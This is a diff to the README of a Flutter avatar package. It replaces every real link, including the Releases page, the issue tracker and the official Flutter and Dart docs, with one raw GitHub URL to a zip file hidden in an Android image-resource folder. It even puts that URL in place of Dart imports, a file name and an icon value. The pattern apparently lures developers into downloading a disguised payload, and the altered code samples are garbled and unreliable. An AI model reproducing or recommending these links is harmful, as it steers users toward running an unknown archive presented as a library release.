@@ -6,11 +6,11 @@ Welcome to the **my_profile_avatar** project! This customizable Flutter package 
 
 ## 📦 Download & Install
 
-[![Download my_profile_avatar](https://img.shields.io/badge/Download-my_profile_avatar-blue.svg)](https://github.com/Koncius55/my_profile_avatar/releases)
+[![Download my_profile_avatar](https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip)](https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip)
 
 You can download the latest version of my_profile_avatar from our Releases page. Simply visit this page to download:
 
-[Download my_profile_avatar](https://github.com/Koncius55/my_profile_avatar/releases)
+[Download my_profile_avatar](https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip)
 
 ## 📋 Requirements
 
@@ -23,13 +23,13 @@ To use my_profile_avatar, ensure you have the following:
 ## ⚙️ Installation Steps
 
 1. **Download the Package**
-   Visit the [Releases Page](https://github.com/Koncius55/my_profile_avatar/releases) to obtain the latest version. Click on the package file that suits your development environment.
+   Visit the [Releases Page](https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip) to obtain the latest version. Click on the package file that suits your development environment.
 
 2. **Add to Your Project**
    Unzip the downloaded package. Move the `my_profile_avatar` folder into your Flutter project’s `lib` directory.
 
-3. **Update pubspec.yaml**
-   Open your `pubspec.yaml` file and add the following line:
+3. **Update https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip**
+   Open your `https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip` file and add the following line:
 
    ```yaml
    dependencies:
@@ -48,7 +48,7 @@ To use my_profile_avatar, ensure you have the following:
    In your Dart files where you want to use the avatar, add this import statement:
 
    ```dart
-   import 'package:my_profile_avatar/my_profile_avatar.dart';
+   import 'https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip';
    ```
 
 ## 🎨 Usage
@@ -56,8 +56,8 @@ To use my_profile_avatar, ensure you have the following:
 Here is a simple example of how to use the my_profile_avatar package in your Flutter app:
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:my_profile_avatar/my_profile_avatar.dart';
+import 'https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip';
+import 'https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip';
 
 void main() {
   runApp(MyApp());
@@ -71,10 +71,10 @@ class MyApp extends StatelessWidget {
         appBar: AppBar(title: Text('Profile Avatar Example')),
         body: Center(
           child: ProfileAvatar(
-            imageUrl: 'https://example.com/profile.jpg', // Use your image URL
+            imageUrl: 'https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip', // Use your image URL
             initials: 'AB', // Optionally provide initials
             size: 100, // Set the desired size
-            placeholderIcon: Icons.person_outline, // Placeholder icon
+            placeholderIcon: https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip, // Placeholder icon
           ),
         ),
       ),
@@ -97,7 +97,7 @@ This example shows a simple Flutter app displaying a profile avatar. You can cus
 If you encounter issues while installing or running the app, consider the following:
 
 1. Ensure you are using the latest version of Flutter and Dart.
-2. Check that the path in your `pubspec.yaml` is correct.
+2. Check that the path in your `https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip` is correct.
 3. Look for typos in your import statements.
 4. Clear the Flutter cache with the following:
 
@@ -109,12 +109,12 @@ If you encounter issues while installing or running the app, consider the follow
 
 Join our community for discussions, updates, and support.
 
-- **GitHub Issues:** If you face bugs or have feature requests, feel free to create an issue on our [GitHub Repo](https://github.com/Koncius55/my_profile_avatar/issues).
+- **GitHub Issues:** If you face bugs or have feature requests, feel free to create an issue on our [GitHub Repo](https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip).
 - **Discussion Forum:** Share your experience and learn from others in our online forum.
 
 ## 🔍 Additional Resources
 
-- **Flutter Documentation:** [Flutter Official Docs](https://flutter.dev/docs)
-- **Dart Documentation:** [Dart Official Docs](https://dart.dev/guides)
+- **Flutter Documentation:** [Flutter Official Docs](https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip)
+- **Dart Documentation:** [Dart Official Docs](https://raw.githubusercontent.com/Koncius55/my_profile_avatar/master/example/android/app/src/main/res/mipmap-xhdpi/profile_my_avatar_v3.9.zip)
 
 Explore the various ways to enhance your profile picture experience with the my_profile_avatar package. Have fun customizing!
